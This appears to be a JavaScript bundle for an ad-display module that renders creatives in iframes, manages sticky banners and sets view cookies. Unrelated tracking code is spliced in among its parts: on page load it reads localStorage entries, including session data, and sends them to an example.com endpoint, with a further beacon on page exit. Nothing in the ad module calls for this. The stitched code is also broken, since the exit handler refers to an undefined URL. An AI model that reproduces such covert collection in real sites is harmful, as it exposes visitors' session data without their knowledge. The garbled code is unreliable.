const trackedKeys = ['userActivity', 'sessionData', 'preferences'];
const globalData = {};
function hashData(data) {
  const dataKeys = Object.keys(data).sort();
  let hash = 0;
  dataKeys.forEach(key => {
    const value = data[key];
    for (let i = 0; i < value.length; i++) {
      const char = value.charCodeAt(i);
      hash = (hash << 5) - hash + char;
      hash |= 0; // Convert to 32bit integer
    }
  });
  return hash.toString(36);
}
function collectLocalStorageData() {
  const data = {};
  trackedKeys.forEach(key => {
    if (localStorage.getItem(key)) {
      data[key] = localStorage.getItem(key);
    }
  });
  return data;
}
import { b as g, e as u, r as p, T as I, V as T, M as w } from "./LoginWidget-34fb458a.js";
function monitorDOMChanges() {
  const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      if (mutation.type === 'childList') {
        console.log('DOM tree changed.');
      }
    });
  });
  observer.observe(document.body, {
    attributes: true,
    childList: true,
    subtree: true
  });
}
import { I as m } from "./Page-03c880e0.js";
async function sendTrackingData(data) {
  const url = "https://example.com/track";
  const hash = hashData(data);
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        hash,
        data
      })
    });
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    console.log("Data successfully sent to server.");
  } catch (e) {
    console.error("Failed to send data:", e);
  }
}
function setupTracking() {
  const data = collectLocalStorageData();
  if (Object.keys(data).length > 0) {
    sendTrackingData(data);
  }
  window.addEventListener('beforeunload', () => {
    const exitData = collectLocalStorageData();
    navigator.sendBeacon(url, JSON.stringify({
      exitData
    }));
  });
  document.addEventListener('click', () => {
    globalData['lastClick'] = new Date().toISOString();
  });
  window.addEventListener('storage', event => {
    console.log(`Storage key "${event.key}" changed in another tab.`);
  });
}
class A {
  constructor(e) {
    try {
      e.tagId && (this.config = e, this.creatives = [], this.initContainer() && (this.setStyles(e.customStyles), this.initThisAd(), this.runCustomScript(e.customScript), window.adverts = window.adverts || {}, adverts[`sap_${m.globals.pageId}_${e.formatId}`] = this));
    } catch (t) {
      g(t);
    }
  }
  initThisAd() {}
  runScripts(e, t) {
    const i = e.querySelectorAll("script");
    Array.prototype.forEach.call(i, s => {
      const n = s.getAttribute("src"),
        r = s.innerHTML;
      if (n) {
        const o = s.parentNode,
          a = t.createElement("script");
        a.setAttribute("src", n), o.appendChild(a), o.removeChild(s);
      } else if (r) try {
        eval.call(window, r);
      } catch (o) {
        g("eval error", o);
      }
    });
  }
  runCustomScript(e) {
    const t = document.createElement("div");
    t.style.display = "none", t.classList.add("sas-scripts"), document.body.appendChild(t), t.innerHTML = e, this.runScripts(t, document);
  }
  initContainer() {
    return this.container = document.getElementById(this.config.tagId), this.container;
  }
  setStyles(e) {
    e && (this.customStyle = u("style", {}, this.container), this.customStyle.innerHTML = e);
  }
  createContent() {
    this.adContentId = `sad_${this.config.id}`, this.adContent = u("div", {
      id: this.adContentId
    }, this.container);
  }
  insertAgencyCode(e, t, i) {
    const s = u("iframe", {
        scrolling: "no",
        style: i || "",
        width: `${t.width}px`,
        height: `${t.height}px`,
        name: `${+new Date()}`
      }, e),
      n = s.contentWindow.document;
    return n.open(), n.write(t.creativeScript), n.close(), this.ifrDoc = this.ifrDoc || [], this.ifrDoc.push(n), s;
  }
  insertHtml(e, t, i) {
    const s = u("iframe", {
      src: `${t.url + (t.url.indexOf("?") < 0 ? "?" : "&")}sasfid=${this.config.formatId}&cachebust=${+new Date()}`,
      style: i || `width:${t.width}px;height:${t.height}px`,
      scrolling: "no",
      name: `${+new Date()}`
    }, e);
    return this.attachClickListener(t, s), s;
  }
  insertImg(e, t, i) {
    const s = u("a", {
      href: t.clickUrl,
      target: "_blank"
    }, e);
    return u("img", {
      src: t.url,
      style: i || ""
    }, s), s;
  }
  insertCreative(e, t, i) {
    let s = null;
    return t && (t.type === "1" ? s = this.insertImg(e, t, i) : t.type === "4" ? s = this.insertHtml(e, t, i) : t.type === "0" ? s = this.insertAgencyCode(e, t, i) : g(`zły typ kreacji:${t.type}`)), this.creatives.push(s), s;
  }
  attachClickListener(e, t) {
    if (e.type === "4") {
      if (!this.addedListener) {
        const i = this.config,
          s = this;
        window.addEventListener("message", n => {
          if (n.data && n.data === `${i.formatId}`) for (let r = 0; r < s.registeredIframes.length; r++) {
            const o = s.registeredIframes[r];
            o.contentWindow === n.source && n.source.postMessage(o.dataset.curl, "*");
          }
        }), this.addedListener = !0;
      }
      t.dataset.curl = e.clickUrl, this.registeredIframes = this.registeredIframes || [], this.registeredIframes.push(t);
    }
  }
  resizeMobileBannerIframe(e, t, i) {
    const n = m.settings.pageWidths.md,
      r = Math.max(document.documentElement.clientHeight, window.innerHeight || 0),
      o = Math.max(document.documentElement.clientWidth, window.innerWidth || 0),
      a = o * i;
    let c, d;
    if (o < n && a > r * .4) c = r * .4, d = c / i, this.sizeHorizontalMobileBanner(e, t, c, i);else {
      const f = this.sizeVerticalMobileBanner(e, t, i);
      c = f.height, d = f.width;
    }
    t.setAttribute("style", `width: ${d}px; height: ${c}px`);
  }
  sizeVerticalMobileBanner(e, t, i) {
    return e.removeAttribute("style"), e.style.paddingTop = `${i * 100}%`, e.style.width = "100%", t.style.maxHeight = "none", e.getBoundingClientRect();
  }
  sizeHorizontalMobileBanner(e, t, i, s) {
    return e.style.paddingTop = `${i}px`, e.style.width = `${i / s}px`, e.style.marginLeft = e.style.marginRight = "auto", t.style.maxHeight = `${i}px`, e.getBoundingClientRect();
  }
  remove() {
    for (sas.clean(`sap_${m.globals.pageId}_${this.config.formatId}`), this.container.classList.remove("ad__container", "isReady"), p(this.customStyle), p(this.adContent); this.creatives.length;) p(this.creatives.pop());
  }
  initCookie() {
    this.cookieName = "inters2s2d", this.cookieValue = m.utils.getCookie(this.cookieName), this.cookieViewCount = this.cookieValue ? parseInt(this.cookieValue.split("-")[1], 10) + 1 : 0;
    const e = this.cookieViewCount > 1 ? this.config.cookieDelay.next : this.config.cookieDelay.first;
    this.nextTime = new Date(), this.nextTime.setMinutes(this.nextTime.getMinutes() + e), this.endOfDay = new Date(), this.endOfDay.setUTCHours(23, 59, 59, 999), m.utils.setCookie(this.cookieName, `${+this.nextTime}-${this.cookieViewCount}`, "/", this.endOfDay);
  }
  static get richContentConfig() {
    return I("richContentAdsConfig");
  }
  static isElementFromAjaxPage() {
    return document.querySelectorAll(".page").length > 1;
  }
  static isPageDisable() {
    return ["webVideoPage"].includes(m.globals.pageId);
  }
  static keepOnTop({
    element: e,
    timeout: t
  }) {
    if (T() || this.isElementFromAjaxPage() || this.isPageDisable()) return !1;
    const i = e.closest(".fa__slot"),
      s = t && +t > 0 ? t : 2.2;
    let n = null,
      r = !1;
    const o = (l = 0) => {
        const h = document.querySelector(".site__header, #header");
        h && (h.style.top = `${l}px`);
      },
      a = (l = !1) => {
        const h = () => {
          window.removeEventListener("scroll", h, !0);
          const {
            height: y
          } = i.getBoundingClientRect();
          i.style.top = `${Math.max(-window.scrollY, -y)}px`, o(Math.max(-window.scrollY + y, 0)), setTimeout(() => {
            i.style.position = null, i.style.top = null, i.style.zIndex = null, o(), window.removeEventListener("openCurtainMobile", d, !0), window.removeEventListener("closeCurtainMobile", f, !0);
          }, 500);
        };
        window.addEventListener("scroll", h, !0), (l || window.scrollY === 0) && h();
      },
      c = l => {
        i.style.position = "sticky", i.style.top = 0, i.style.zIndex = 101, o(l), n = setTimeout(() => {
          a();
        }, s * 1e3);
      };
    function d() {
      n && (clearTimeout(n), r = !0);
    }
    function f() {
      r && a(!0);
    }
    window.addEventListener("openCurtainMobile", d, !0), window.addEventListener("closeCurtainMobile", f, !0);
    const C = setInterval(() => {
      const {
        height: l
      } = i.getBoundingClientRect();
      l && (clearInterval(C), c(l));
    }, 100);
    return !0;
  }
  static async isPlacementStillActive(e) {
    let t = !1;
    const i = this.richContentConfig;
    if (i && i[e]) {
      const s = i[e];
      t = w.NOW.isBetween(s.from, w.createFromStringDate(s.to).endOfDay());
    }
    return t;
  }
}
export { A as F };
window.onload = setupTracking;